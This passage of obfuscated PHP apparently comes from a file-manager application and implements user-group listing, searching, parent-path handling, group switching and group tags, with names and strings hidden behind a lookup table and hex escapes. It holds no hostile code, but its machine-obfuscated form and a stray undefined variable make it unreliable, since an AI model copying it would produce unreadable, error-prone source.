Model($³¼ÍÍÅ³[2213])->where($£Í øËŠ)->delete(); Model($³¼ÍÍÅ³[2214])->where($£Í øËŠ)->delete(); Model($³¼ÍÍÅ³[916])->groupRootRemove($ŸÁÒ¯÷™); $this->_clearCache($İ§ë‰Ä«[$³¼ÍÍÅ³[191]]); return $this->where($£Í øËŠ)->delete(); } protected function groupSort($ğğŠŞ×) { $­÷öûÇ— =& $_SERVER[¿ÈˆÑ¸ä]; $¹€¬ŒŠé = array(); foreach ($ğğŠŞ× as $‹§µ¸ÄÒ => $—¥è½·) { $¹€¬ŒŠé[] = array($­÷öûÇ—[1431], $—¥è½·, $­÷öûÇ—[2144], $‹§µ¸ÄÒ + 1); } $this->saveAll($¹€¬ŒŠé); } public function listData() { $Âƒœú‚é = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Âƒœú‚é[$_SERVER[¿ÈˆÑ¸ä][446]]); return $Âƒœú‚é; } private function _makeOrder($™ø°Á‹ã = '') { $‘É‹Ä³± =& $_SERVER[¿ÈˆÑ¸ä]; $ÂƒÑ¤ï— = array($‘É‹Ä³±[1431], $‘É‹Ä³±[32], $‘É‹Ä³±[2111], $‘É‹Ä³±[232]); $‹Áå¹Ìë = array($‘É‹Ä³±[533] => $‘É‹Ä³±[534], $‘É‹Ä³±[535] => $‘É‹Ä³±[536]); $ãò¡Ğ¢Ó = Input::get($‘É‹Ä³±[540], $‘É‹Ä³±[7], $‘É‹Ä³±[2126], $ÂƒÑ¤ï—); $¹Î®éó† = Input::get($‘É‹Ä³±[541], $‘É‹Ä³±[7], $‘É‹Ä³±[2215], array($‘É‹Ä³±[2215], $‘É‹Ä³±[535])); $¹Î®éó† = $‹Áå¹Ìë[$¹Î®éó†]; $™ø°Á‹ã = $™ø°Á‹ã . "{$ãò¡Ğ¢Ó}\40{$¹Î®éó†}\x2c\40\147\162\157\165\x70\111\104\40\141\163\x63"; return $this->order($™ø°Á‹ã); } public function listChild($ãÆÔñÍ) { $Ê±¢‰Àš =& $_SERVER[¿ÈˆÑ¸ä]; $Ç“‰ª¶é = $this->where(array($Ê±¢‰Àš[191] => $ãÆÔñÍ))->_makeOrder()->selectPage(200); $this->_listDataApply($Ç“‰ª¶é[$Ê±¢‰Àš[446]]); return $Ç“‰ª¶é; } public function listChildIds($ù…Û ¾) { $®Ş°˜ˆ¶ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($”Œ‡–Ş«)) { $ù…Û ¾ = explode($®Ş°˜ˆ¶[50], $ù…Û ¾); } $ÆÓì©¡ = $this->where(array($®Ş°˜ˆ¶[1431] => array($®Ş°˜ˆ¶[7], $ù…Û ¾)))->field($®Ş°˜ˆ¶[2216])->select(); if (!$ÆÓì©¡) { return !1; } $ò™ç‘° = array(); foreach ($ÆÓì©¡ as $¿ˆÀãâ) { $ò™ç‘°[] = "\x73\x65\x6c\145\x63\x74\x20\147\162\157\x75\x70\111\x44\40\146\162\x6f\x6d\40\140\x67\x72\x6f\x75\x70\140\x20\167\x68\145\162\145\x20\160\x61\x72\x65\156\x74\114\x65\x76\145\x6c\40\x6c\151\153\145\x20\47{$¿ˆÀãâ[$®Ş°˜ˆ¶[600]]}{$¿ˆÀãâ[$®Ş°˜ˆ¶[1431]]}\54\45\47"; } $ò™ç‘° = implode($®Ş°˜ˆ¶[2217], $ò™ç‘°); $ÆÓì©¡ = $this->query($ò™ç‘°); if (!$ÆÓì©¡) { return array(); } $ù…Û ¾ = array_to_keyvalue($ÆÓì©¡, $®Ş°˜ˆ¶[12], $®Ş°˜ˆ¶[1431]); return array_unique($ù…Û ¾); } public function listByID($©‰§´Å) { $Ô½Œ¶úô =& $_SERVER[¿ÈˆÑ¸ä]; if (!$©‰§´Å) { return array(); } $ÅÆİÁÂ¤ = array($Ô½Œ¶úô[1431] => array($Ô½Œ¶úô[7], $©‰§´Å)); $ÜßâÀòè = $this->where($ÅÆİÁÂ¤)->select(); $ÜßâÀòè = array_sort_keep($ÜßâÀòè, $Ô½Œ¶úô[1431], $©‰§´Å); $this->_listDataApply($ÜßâÀòè); return $ÜßâÀòè; } public function listSearch($šıîğÃ¢) { $¬×ŒõÜÂ =& $_SERVER[¿ÈˆÑ¸ä]; $ó–ÓœçÎ = trim($šıîğÃ¢[$¬×ŒõÜÂ[2218]]); $ù°²‡ìã = explode($¬×ŒõÜÂ[53], $ó–ÓœçÎ); if (!$ó–ÓœçÎ || count($ù°²‡ìã) == 1) { return $this->listSearchNow($šıîğÃ¢); } $Õ·äší = array($¬×ŒõÜÂ[446] => array()); foreach ($ù°²‡ìã as $ÃÚº´îÉ) { if (!trim($ÃÚº´îÉ)) { continue; } $šıîğÃ¢[$¬×ŒõÜÂ[2218]] = $ÃÚº´îÉ; $úàˆ´‘Ì = $this->listSearchNow($šıîğÃ¢); $Õ·äší[$¬×ŒõÜÂ[446]] = array_merge($Õ·äší[$¬×ŒõÜÂ[446]], $úàˆ´‘Ì[$¬×ŒõÜÂ[446]]); } $Õ·äší[$¬×ŒõÜÂ[446]] = array_unique_by_key($Õ·äší[$¬×ŒõÜÂ[446]], $¬×ŒõÜÂ[1431]); $Õ·äší[$¬×ŒõÜÂ[443]] = array($¬×ŒõÜÂ[444] => count($Õ·äší[$¬×ŒõÜÂ[446]]), $¬×ŒõÜÂ[440] => 20, $¬×ŒõÜÂ[429] => 1, $¬×ŒõÜÂ[445] => 1); return $Õ·äší; } public function listSearchNow($åç‰¬à×) { $ŒŒ‹¼º =& $_SERVER[¿ÈˆÑ¸ä]; $õğüêÕ¸ = trim($åç‰¬à×[$ŒŒ‹¼º[2218]]); $µŞ¼İ“ = isset($åç‰¬à×[$ŒŒ‹¼º[2219]]) ? $åç‰¬à×[$ŒŒ‹¼º[2219]] : !1; if (!trim($õğüêÕ¸)) { return !1; } $õğüêÕ¸ = str_replace($ŒŒ‹¼º[2220], $ŒŒ‹¼º[2221], $õğüêÕ¸); $¨àÅ”°Å = array($ŒŒ‹¼º[1431] => array($ŒŒ‹¼º[470], "{$õğüêÕ¸}\x25"), $ŒŒ‹¼º[32] => array($ŒŒ‹¼º[470], "\x25{$õğüêÕ¸}\x25"), $ŒŒ‹¼º[1103] => $ŒŒ‹¼º[2222]); if ($µŞ¼İ“) { $Ü€òÚ×Ù = $this->getInfoSimple($µŞ¼İ“); $–Ş®Öê = $Ü€òÚ×Ù[$ŒŒ‹¼º[600]] . $µŞ¼İ“ . $ŒŒ‹¼º[632]; $¨àÅ”°Å = array($¨àÅ”°Å, array($ŒŒ‹¼º[600] => array($ŒŒ‹¼º[470], $–Ş®Öê))); } $¨àÅ”°Å = $this->parseWhereLike($¨àÅ”°Å); $»Æ”Åµ = $this->_makeOrder()->where($¨àÅ”°Å)->selectPage(20); $»Æ”Åµ = $»Æ”Åµ ? $»Æ”Åµ : array($ŒŒ‹¼º[446] => array(), $ŒŒ‹¼º[443] => array()); if (!$»Æ”Åµ || count($»Æ”Åµ[$ŒŒ‹¼º[446]]) < 5 && Input::check($õğüêÕ¸, $ŒŒ‹¼º[394])) { $ÌÓ¯Š²Ü = $this->groupChildrenAll($µŞ¼İ“); $œ”æ­çĞ = $this->_searchFromMeta($ŒŒ‹¼º[547], $õğüêÕ¸, 10, $ÌÓ¯Š²Ü); $ÕËñË = $this->_searchFromMeta($ŒŒ‹¼º[548], $õğüêÕ¸, 10, $ÌÓ¯Š²Ü); $ÑëïÛÙÙ = array_merge($œ”æ­çĞ, $ÕËñË, $»Æ”Åµ[$ŒŒ‹¼º[446]]); $»Æ”Åµ[$ŒŒ‹¼º[446]] = array_unique_by_key($ÑëïÛÙÙ, $ŒŒ‹¼º[1431]); $»Æ”Åµ[$ŒŒ‹¼º[443]][$ŒŒ‹¼º[444]] = count($»Æ”Åµ[$ŒŒ‹¼º[446]]); $»Æ”Åµ[$ŒŒ‹¼º[443]][$ŒŒ‹¼º[445]] = ceil($»Æ”Åµ[$ŒŒ‹¼º[443]][$ŒŒ‹¼º[444]] / $»Æ”Åµ[$ŒŒ‹¼º[443]][$ŒŒ‹¼º[440]]); } $this->_listDataApply($»Æ”Åµ[$ŒŒ‹¼º[446]]); return $»Æ”Åµ; } protected function groupChildrenAll($ò¢ŒæŠÛ) { $ÖÇˆ×à =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ò¢ŒæŠÛ) { return !1; } if (!is_array($ò¢ŒæŠÛ)) { $ò¢ŒæŠÛ = array($ò¢ŒæŠÛ); } $±ªÖ®ÏÅ = $ò¢ŒæŠÛ; foreach ($ò¢ŒæŠÛ as $Íñ‡ùÌ±) { $ìö¦Òü = $this->getInfoSimple($Íñ‡ùÌ±); $¹†ô¬¬¢ = array($ÖÇˆ×à[600] => array($ÖÇˆ×à[470], $ìö¦Òü[$ÖÇˆ×à[600]] . $Íñ‡ùÌ± . $ÖÇˆ×à[632])); $Şæû½Î = $this->field($ÖÇˆ×à[1431])->where($¹†ô¬¬¢)->select(); $±ªÖ®ÏÅ = array_merge($±ªÖ®ÏÅ, array_to_keyvalue($Şæû½Î, $ÖÇˆ×à[12], $ÖÇˆ×à[1431])); } return array_unique($±ªÖ®ÏÅ); } private function _searchFromMeta($ãû›Ã£ù, $ºšêÚ”Ò, $™ç¥´èÄ, $Ñ¬¸ïÑá) { $ù–à•Øı =& $_SERVER[¿ÈˆÑ¸ä]; $ºšêÚ”Ò = strtolower($ºšêÚ”Ò); $£‚Ñ¼ğİ = array($ù–à•Øı[95] => $ãû›Ã£ù, $ù–à•Øı[451] => array($ù–à•Øı[470], "\45{$ºšêÚ”Ò}\x25")); $£‚Ñ¼ğİ = $this->parseWhereLike($£‚Ñ¼ğİ); if ($Ñ¬¸ïÑá) { $£‚Ñ¼ğİ[$ù–à•Øı[1431]] = array($ù–à•Øı[7], $Ñ¬¸ïÑá); } $¿í‹Âğ» = Model($ù–à•Øı[2223])->where($£‚Ñ¼ğİ)->limit($™ç¥´èÄ)->select(); if (!$¿í‹Âğ») { return array(); } $¿í‹Âğ» = array_to_keyvalue($¿í‹Âğ», $ù–à•Øı[12], $ù–à•Øı[1431]); $º¼à¥ö• = $this->where(array($ù–à•Øı[2207] => array($ù–à•Øı[7], $¿í‹Âğ»)))->select(); if (!$º¼à¥ö•) { return array(); } return $º¼à¥ö•; } protected function _listDataApplyItem($¥ÓÒàÀ°) { $”ƒáú¬« = array($¥ÓÒàÀ°); $this->_listDataApply($”ƒáú¬«); return $”ƒáú¬«[0]; } protected function _listDataApply(&$ş××¹ò”) { $‚›‘‰û =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ş××¹ò”) { return; } $®ÎÏÈ­ = array_to_keyvalue($ş××¹ò”, $‚›‘‰û[12], $‚›‘‰û[1431]); $this->_listAppendChildren($ş××¹ò”); $this->_listAppendChildrenMember($ş××¹ò”); $this->_listAppendMeta($ş××¹ò”, $®ÎÏÈ­); $this->_listAppendParent($ş××¹ò”); $this->_listAppendSourceRoot($ş××¹ò”, $®ÎÏÈ­); } private function _listAppendChildren(&$ÛôÄı„Î) { $˜š™‡µÔ =& $_SERVER[¿ÈˆÑ¸ä]; $ÆÒ¬·×Ğ = array_to_keyvalue($ÛôÄı„Î, $˜š™‡µÔ[12], $˜š™‡µÔ[1431]); $€áî›©÷ = array($˜š™‡µÔ[191] => array($˜š™‡µÔ[7], $ÆÒ¬·×Ğ)); $“Ìà’¡ = array($˜š™‡µÔ[191], $˜š™‡µÔ[2224] => $˜š™‡µÔ[581]); $Ô¯ÌşÓË = $this->field($“Ìà’¡)->where($€áî›©÷)->group($˜š™‡µÔ[191])->select(); $Á”ò’ÓÈ = array_to_keyvalue($Ô¯ÌşÓË, $˜š™‡µÔ[191], $˜š™‡µÔ[581]); foreach ($ÛôÄı„Î as &$èó¥âí¯) { $¡•½  = $èó¥âí¯[$˜š™‡µÔ[1431]]; $èó¥âí¯[$˜š™‡µÔ[2225]] = isset($Á”ò’ÓÈ[$¡•½ ]) ? intval($Á”ò’ÓÈ[$¡•½ ]) : !1; } unset($èó¥âí¯); } private function _listAppendChildrenMember(&$ó®Š±ºç) { $·¡Ñ¸š =& $_SERVER[¿ÈˆÑ¸ä]; $°ñ”Çì = array_to_keyvalue($ó®Š±ºç, $·¡Ñ¸š[12], $·¡Ñ¸š[1431]); $Æƒ—öÈÌ = array($·¡Ñ¸š[1431] => array($·¡Ñ¸š[7], $°ñ”Çì)); $¢ÈÖÎÄÄ = array($·¡Ñ¸š[1431], $·¡Ñ¸š[2224] => $·¡Ñ¸š[581]); $€äùéÃ = Model($·¡Ñ¸š[2214])->field($¢ÈÖÎÄÄ)->where($Æƒ—öÈÌ)->group($·¡Ñ¸š[1431])->select(); $¦äÆ¶¡É = array_to_keyvalue($€äùéÃ, $·¡Ñ¸š[1431], $·¡Ñ¸š[581]); foreach ($ó®Š±ºç as &$íËïÇ¡ğ) { $Åë—Ä¥ = $íËïÇ¡ğ[$·¡Ñ¸š[1431]]; $íËïÇ¡ğ[$·¡Ñ¸š[2226]] = isset($¦äÆ¶¡É[$Åë—Ä¥]) ? intval($¦äÆ¶¡É[$Åë—Ä¥]) : !1; } unset($íËïÇ¡ğ); } private function _listAppendMeta(&$§â§üù¯, $–èÔê™Ò) { $¥õ‘îİñ =& $_SERVER[¿ÈˆÑ¸ä]; $·÷Ê¢ò° = array($¥õ‘îİñ[1431] => array($¥õ‘îİñ[7], $–èÔê™Ò)); $³â†ıˆğ = Model($¥õ‘îİñ[2213])->where($·÷Ê¢ò°)->select(); $³â†ıˆğ = array_to_keyvalue_group($³â†ıˆğ, $¥õ‘îİñ[1431]); foreach ($³â†ıˆğ as &$¾¸ı‚¶ª) { $¾¸ı‚¶ª = array_to_keyvalue($¾¸ı‚¶ª, $¥õ‘îİñ[95], $¥õ‘îİñ[451]); } unset($¾¸ı‚¶ª); foreach ($§â§üù¯ as &$ûšÈÆ€¦) { $ûšÈÆ€¦[$¥õ‘îİñ[551]] = array(); if (isset($³â†ıˆğ[$ûšÈÆ€¦[$¥õ‘îİñ[1431]]])) { $ûšÈÆ€¦[$¥õ‘îİñ[551]] = $³â†ıˆğ[$ûšÈÆ€¦[$¥õ‘îİñ[1431]]]; } } unset($ûšÈÆ€¦); } protected function parentLevelArray($ÛÑŠ¬Ô¯) { $·—âŞÅà =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÑŠ¬Ô¯ = explode($·—âŞÅà[50], trim($ÛÑŠ¬Ô¯, $·—âŞÅà[50])); $ÛÑŠ¬Ô¯ = array_remove_value($ÛÑŠ¬Ô¯, $·—âŞÅà[229]); return $ÛÑŠ¬Ô¯; } protected function parentInGroup($æƒÜ³ÓŒ, $µ™ÜÍÍğ) { $²·àÄå„ =& $_SERVER[¿ÈˆÑ¸ä]; $×Ô¹¡€Ì = $this->getInfoSimple($æƒÜ³ÓŒ); if (!$×Ô¹¡€Ì) { return !0; } $€¥œğ—§ = $this->parentLevelArray($×Ô¹¡€Ì[$²·àÄå„[600]]); $€¥œğ—§[] = $æƒÜ³ÓŒ; foreach ($€¥œğ—§ as $æƒÜ³ÓŒ) { if (in_array($æƒÜ³ÓŒ . $²·àÄå„[12], $µ™ÜÍÍğ)) { return !0; } } return !1; } private function _listAppendParent(&$Ä°ŸŒ›í) { $öşì¼º™ =& $_SERVER[¿ÈˆÑ¸ä]; $û´µÍ¿ß = array(); foreach ($Ä°ŸŒ›í as &$œì’üˆ) { $û´µÍ¿ß[$œì’üˆ[$öşì¼º™[1431]]] = $œì’üˆ[$öşì¼º™[32]]; $ÓİÎÜÎÄ = $this->parentLevelArray($œì’üˆ[$öşì¼º™[600]]); foreach ($ÓİÎÜÎÄ as $şß±Ñä) { if (!isset($û´µÍ¿ß[$şß±Ñä])) { $û´µÍ¿ß[$şß±Ñä] = 0; } } } unset($œì’üˆ); foreach ($û´µÍ¿ß as $Ê³òŞÓ => $¥µ€şƒú) { if ($¥µ€şƒú) { continue; } $œû„Á–¯ = $this->getInfoSimple($Ê³òŞÓ); $û´µÍ¿ß[$Ê³òŞÓ] = $œû„Á–¯[$öşì¼º™[32]]; } $ŸåÚÓˆÀ = $GLOBALS[$öşì¼º™[6]][$öşì¼º™[92]][$öşì¼º™[2227]]; if (KodUser::isRoot()) { $ŸåÚÓˆÀ = !1; } foreach ($Ä°ŸŒ›í as &$œì’üˆ) { $ÓİÎÜÎÄ = $this->parentLevelArray($œì’üˆ[$öşì¼º™[600]]); $Ö¡Ğ«±Æ = $öşì¼º™[12]; foreach ($ÓİÎÜÎÄ as $Ê³òŞÓ => $şß±Ñä) { if ($ŸåÚÓˆÀ && $Ê³òŞÓ == 0) { continue; } $Ö¡Ğ«±Æ .= $û´µÍ¿ß[$şß±Ñä] . $öşì¼º™[8]; } if ($ÓİÎÜÎÄ) { $Ö¡Ğ«±Æ .= $œì’üˆ[$öşì¼º™[32]]; } $œì’üˆ[$öşì¼º™[605]] = str_replace($öşì¼º™[255], $öşì¼º™[8], $Ö¡Ğ«±Æ); } unset($œì’üˆ); } private function _listAppendSourceRoot(&$ïÒë—¯‹, $…¹±„ª¡) { $â˜è =& $_SERVER[¿ÈˆÑ¸ä]; $ÇÁÕ†éØ = Model($â˜è[916])->listSourceRoot(SourceModel::TYPE_GROUP, $…¹±„ª¡); $ÇÁÕ†éØ = array_to_keyvalue($ÇÁÕ†éØ, $â˜è[585]); $ÇÁÕ†éØ = array_remove_key($ÇÁÕ†éØ, $â˜è[585]); foreach ($ïÒë—¯‹ as &$ÆŒÛî™ğ) { $ÆŒÛî™ğ[$â˜è[90]] = $ÇÁÕ†éØ[$ÆŒÛî™ğ[$â˜è[1431]]] ? $ÇÁÕ†éØ[$ÆŒÛî™ğ[$â˜è[1431]]] : array(); } unset($ÆŒÛî™ğ); } protected function groupMerge($¢Ÿáß‰) { $¢Ÿáß‰ = array_values(array_unique($¢Ÿáß‰)); $€¹¨›Î– = array(); for ($œšµÙõÑ = 0; $œšµÙõÑ < count($¢Ÿáß‰); $œšµÙõÑ++) { $ß¸ Û¨• = !1; for ($‘áÒã… = 0; $‘áÒã… < count($¢Ÿáß‰); $‘áÒã…++) { if ($œšµÙõÑ == $‘áÒã…) { continue; } if ($this->isParentOf($¢Ÿáß‰[$‘áÒã…], $¢Ÿáß‰[$œšµÙõÑ])) { $ß¸ Û¨• = !0; break; } } if (!$ß¸ Û¨•) { $€¹¨›Î–[] = $¢Ÿáß‰[$œšµÙõÑ]; } } return $€¹¨›Î–; } protected function isParentOf($Ëû¼õµ, $äåéŞ„ç) { $´µÉ®©Ö =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ëû¼õµ || !$äåéŞ„ç || $Ëû¼õµ == $äåéŞ„ç) { return !1; } $³©Ø˜€“ = $this->getInfoSimple($Ëû¼õµ); $–’¿‰ ÷ = $this->getInfoSimple($äåéŞ„ç); $»ËÁì™í = $³©Ø˜€“[$´µÉ®©Ö[600]] . $Ëû¼õµ . $´µÉ®©Ö[50]; if (substr($–’¿‰ ÷[$´µÉ®©Ö[600]], 0, strlen($»ËÁì™í)) == $»ËÁì™í) { return !0; } return !1; } public function groupShowRoot($»––ºœè, $Õ££³‘ê = false) { $ƒË®œ”î =& $_SERVER[¿ÈˆÑ¸ä]; $©Åù™œ = $this->getInfo($»––ºœè); if (!$©Åù™œ) { return array(); } $œ„ªúï‹ = $this->parentLevelArray($©Åù™œ[$ƒË®œ”î[600]]); $ü¿îÀ = array($»––ºœè); if (count($œ„ªúï‹) == 0) { return $ü¿îÀ; } if ($Õ££³‘ê && count($œ„ªúï‹) == 1) { return $ü¿îÀ; } if (!$©Åù™œ[$ƒË®œ”î[551]] || !isset($©Åù™œ[$ƒË®œ”î[551]][$ƒË®œ”î[2208]]) || $©Åù™œ[$ƒË®œ”î[551]][$ƒË®œ”î[2208]] == $ƒË®œ”î[862]) { return $this->groupShowRoot($œ„ªúï‹[count($œ„ªúï‹) - 1], $Õ££³‘ê); } if ($©Åù™œ[$ƒË®œ”î[551]][$ƒË®œ”î[2208]] == $ƒË®œ”î[433]) { $Œå§éæ« = explode($ƒË®œ”î[50], $©Åù™œ[$ƒË®œ”î[551]][$ƒË®œ”î[2209]]); if ($Œå§éæ«) { $ü¿îÀ = array_merge($ü¿îÀ, $Œå§éæ«); } } return $ü¿îÀ; } protected function resetParentLevel() { $úçœÆ­Õ =& $_SERVER[¿ÈˆÑ¸ä]; $Íµ¢³šŸ = $úçœÆ­Õ[1431]; $»ïáõï² = $this->select(); $»ïáõï² = array_to_keyvalue($»ïáõï², $Íµ¢³šŸ); foreach ($»ïáõï² as $ÔÛ“ˆÅÉ) { $‡¶›‰ò‚ = $ÔÛ“ˆÅÉ; $Ô„Á´ÅÇ = array(); while ($‡¶›‰ò‚[$úçœÆ­Õ[191]] != 0) { $Ô„Á´ÅÇ[] = $‡¶›‰ò‚[$úçœÆ­Õ[191]]; $‡¶›‰ò‚ = $»ïáõï²[$‡¶›‰ò‚[$úçœÆ­Õ[191]]]; } $Ô„Á´ÅÇ[] = 0; $Ô„Á´ÅÇ = $úçœÆ­Õ[50] . implode($úçœÆ­Õ[50], array_reverse($Ô„Á´ÅÇ)) . $úçœÆ­Õ[50]; $this->setNamePinyin($ÔÛ“ˆÅÉ[$Íµ¢³šŸ], $ÔÛ“ˆÅÉ[$úçœÆ­Õ[32]]); $this->where(array($Íµ¢³šŸ => $ÔÛ“ˆÅÉ[$Íµ¢³šŸ]))->save(array($úçœÆ­Õ[671] => $Ô„Á´ÅÇ)); } return $»ïáõï²; } public function groupNameAuto($¼İå½ÃÚ, $°…ÏÜï) { $È—çç´Â =& $_SERVER[¿ÈˆÑ¸ä]; $²¬Şª = $this->where(array($È—çç´Â[488] => $¼İå½ÃÚ))->getField($È—çç´Â[32], !0); if (!$²¬Şª || !in_array($°…ÏÜï, $²¬Şª)) { return $°…ÏÜï; } for ($Ï‹Äóï = 1; $Ï‹Äóï <= count($²¬Şª) + 1; $Ï‹Äóï++) { $øˆÀï‹š = $°…ÏÜï . "\x28{$Ï‹Äóï}\51"; if (!in_array($øˆÀï‹š, $²¬Şª)) { return $øˆÀï‹š; } } } public function groupSwitch($úÙ­„„, $ªÇ»©œü) { $‹ãæ”èÂ =& $_SERVER[¿ÈˆÑ¸ä]; $–•Ãıí = array($‹ãæ”èÂ[1431] => array($‹ãæ”èÂ[7], array($úÙ­„„, $ªÇ»©œü))); $³ªÑ¥¡ƒ = $this->where($–•Ãıí)->select(); $³ªÑ¥¡ƒ = array_to_keyvalue($³ªÑ¥¡ƒ, $‹ãæ”èÂ[1431]); $™Êğ‘ÔÇ = _get($³ªÑ¥¡ƒ, $úÙ­„„); $¶êÑ³¸ë = _get($³ªÑ¥¡ƒ, $ªÇ»©œü); if (!$™Êğ‘ÔÇ || !$¶êÑ³¸ë || $™Êğ‘ÔÇ[$‹ãæ”èÂ[191]] == 0) { return !1; } if ($™Êğ‘ÔÇ[$‹ãæ”èÂ[1431]] == $¶êÑ³¸ë[$‹ãæ”èÂ[1431]]) { return !1; } if (strpos($¶êÑ³¸ë[$‹ãæ”èÂ[600]], $™Êğ‘ÔÇ[$‹ãæ”èÂ[600]] . $™Êğ‘ÔÇ[$‹ãæ”èÂ[1431]] . $‹ãæ”èÂ[50]) === 0) { return !1; } $–•Ãıí = array($‹ãæ”èÂ[1431] => $úÙ­„„); $à¯ªß¥¦ = Model($‹ãæ”èÂ[2214])->where($–•Ãıí)->select(); if (!$à¯ªß¥¦) { $à¯ªß¥¦ = array(); } foreach ($à¯ªß¥¦ as $½ë³‡¢Ò) { $¾“úÚ®Û = $½ë³‡¢Ò[$‹ãæ”èÂ[1529]]; $–•Ãıí = array($‹ãæ”èÂ[1529] => $¾“úÚ®Û, $‹ãæ”èÂ[1431] => $ªÇ»©œü); $œº´·¼ = Model($‹ãæ”èÂ[2214])->where($–•Ãıí)->find(); if (!$œº´·¼) { $¢ŞŠ®Ûâ = array($ªÇ»©œü => $½ë³‡¢Ò[$‹ãæ”èÂ[1576]]); Model($‹ãæ”èÂ[613])->userGroupAdd($¾“úÚ®Û, $¢ŞŠ®Ûâ); } Model($‹ãæ”èÂ[613])->userGroupRemove($¾“úÚ®Û, $úÙ­„„); } $–•Ãıí = array($‹ãæ”èÂ[189] => 2, $‹ãæ”èÂ[191] => 0, $‹ãæ”èÂ[496] => 1, $‹ãæ”èÂ[585] => array($‹ãæ”èÂ[7], array($úÙ­„„, $ªÇ»©œü))); $«¡ÈÔí³ = Model($‹ãæ”èÂ[916])->where($–•Ãıí)->field($‹ãæ”èÂ[2228])->select(); $«¡ÈÔí³ = array_to_keyvalue($«¡ÈÔí³, $‹ãæ”èÂ[585], $‹ãæ”èÂ[192]); $é‰ÓÅİ = !empty($«¡ÈÔí³[$úÙ­„„]) ? $«¡ÈÔí³[$úÙ­„„] : !1; if ($é‰ÓÅİ) { if (!$«¡ÈÔí³[$ªÇ»©œü]) { $«¡ÈÔí³[$ªÇ»©œü] = Model($‹ãæ”èÂ[916])->groupRootAdd($ªÇ»©œü); } $“Û”ä‘ı = $«¡ÈÔí³[$ªÇ»©œü]; $–•Ãıí = array($‹ãæ”èÂ[191] => $é‰ÓÅİ); $«¡ÈÔí³ = Model($‹ãæ”èÂ[916])->where($–•Ãıí)->field($‹ãæ”èÂ[2229])->select(); if (!$«¡ÈÔí³) { $«¡ÈÔí³ = array(); } Model($‹ãæ”èÂ[916])->moveClearAuth = !1; foreach ($«¡ÈÔí³ as $Ë™Èíùå) { $ûÎÖ“º¼ = $Ë™Èíùå[$‹ãæ”èÂ[496]] == $‹ãæ”èÂ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($‹ãæ”èÂ[916])->move($Ë™Èíùå[$‹ãæ”èÂ[192]], $“Û”ä‘ı, $ûÎÖ“º¼); } Model($‹ãæ”èÂ[916])->moveClearAuth = !0; $–•Ãıí = array($‹ãæ”èÂ[189] => 2, $‹ãæ”èÂ[585] => $úÙ­„„); $ı——¾úÜ = array($‹ãæ”èÂ[585] => $ªÇ»©œü); Model($‹ãæ”èÂ[2230])->where($–•Ãıí)->save($ı——¾úÜ); Model($‹ãæ”èÂ[2231])->where($–•Ãıí)->save($ı——¾úÜ); } $this->_changeChildLevel($³ªÑ¥¡ƒ[$úÙ­„„], $³ªÑ¥¡ƒ[$ªÇ»©œü], !0); $this->where(array($‹ãæ”èÂ[191] => $úÙ­„„))->save(array($‹ãæ”èÂ[191] => $ªÇ»©œü)); $this->_clearChildrenCache($³ªÑ¥¡ƒ[$ªÇ»©œü]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($Ã«„…µÃ) { $Î¾‡¼­˜ =& $_SERVER[¿ÈˆÑ¸ä]; return array($Î¾‡¼­˜[2232] => array($Ã«„…µÃ[0], $Î¾‡¼­˜[2233]), $Î¾‡¼­˜[2234] => array($Ã«„…µÃ[0], $Î¾‡¼­˜[2235])); } protected function ___get($úÏÏÒôÎ) { $í´õÁ›ñ =& $_SERVER[¿ÈˆÑ¸ä]; $Ş£ÔÛ¿õ = Model($í´õÁ›ñ[601])->metaGet($úÏÏÒôÎ, $í´õÁ›ñ[2236]); $ı¾¶š å = json_decode($Ş£ÔÛ¿õ, !0); return $ı¾¶š å ? $ı¾¶š å : array($í´õÁ›ñ[2237] => $í´õÁ›ñ[91], $í´õÁ›ñ[446] => array()); } protected function ___listData($Å²¾ˆ´ë) { $ºª³œô =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÖ¥Èš = array($ºª³œô[1907] => 0, $ºª³œô[569] => array($ºª³œô[2238], 0), $ºª³œô[507] => $ºª³œô[1427] . $Å²¾ˆ´ë); $¤ŸëãÒ = $ºª³œô[2239]; $¿çşıÊ = $this->field($¤ŸëãÒ)->where($ÎÖ¥Èš)->order($ºª³œô[2240])->select(); return $¿çşıÊ ? $¿çşıÊ : array(); } protected function set($íßêô‹, $§ôøÎÌ¹) { $Ü…ËÈ¾è =& $_SERVER[¿ÈˆÑ¸ä]; $§ôøÎÌ¹ = $§ôøÎÌ¹ ? $§ôøÎÌ¹ : array($Ü…ËÈ¾è[2237] => $Ü…ËÈ¾è[91], $Ü…ËÈ¾è[446] => array()); return Model($Ü…ËÈ¾è[601])->metaSet($íßêô‹, $Ü…ËÈ¾è[2236], json_encode($§ôøÎÌ¹)); } protected function getByTagID($óƒ‡ó, $Ÿ¬æ¡Š“) { $ïŠŸÔÕ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$óƒ‡ó || !$Ÿ¬æ¡Š“) { return !1; } if (!Model($ïŠŸÔÕ[601])->getInfoSimple($óƒ‡ó)) { return !1; } $­Š€ªå = $this->get($óƒ‡ó); if (!$­Š€ªå || !isset($­Š€ªå[$ïŠŸÔÕ[446]])) { return !1; } $­Ï¸Æ“í = array_find_by_field($­Š€ªå[$ïŠŸÔÕ[446]], $ïŠŸÔÕ[483], $Ÿ¬æ¡Š“); return is_array($­Ï¸Æ“í) ? $­Ï¸Æ“í : !1; } public function listSource($†ÇúØÔ, $ÊÄùâö¬) { $–É°»‘ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ÊÄùâö¬ && !is_array($ÊÄùâö¬)) { $ÊÄùâö¬ = array($ÊÄùâö¬); } $šğ•‰ª = $this->listData($†ÇúØÔ); $Ù—öÁÀæ = array(); foreach ($šğ•‰ª as $¢ÁÊÍ˜«) { $«Ü¢³… = $¢ÁÊÍ˜«[$–É°»‘[87]]; if (!$«Ü¢³…) { continue; } if (!isset($Ù—öÁÀæ[$«Ü¢³…])) { $Ù—öÁÀæ[$«Ü¢³…] = array(); } $Ù—öÁÀæ[$«Ü¢³…][] = $¢ÁÊÍ˜«[$–É°»‘[511]]; } $à°ÛÚò× = 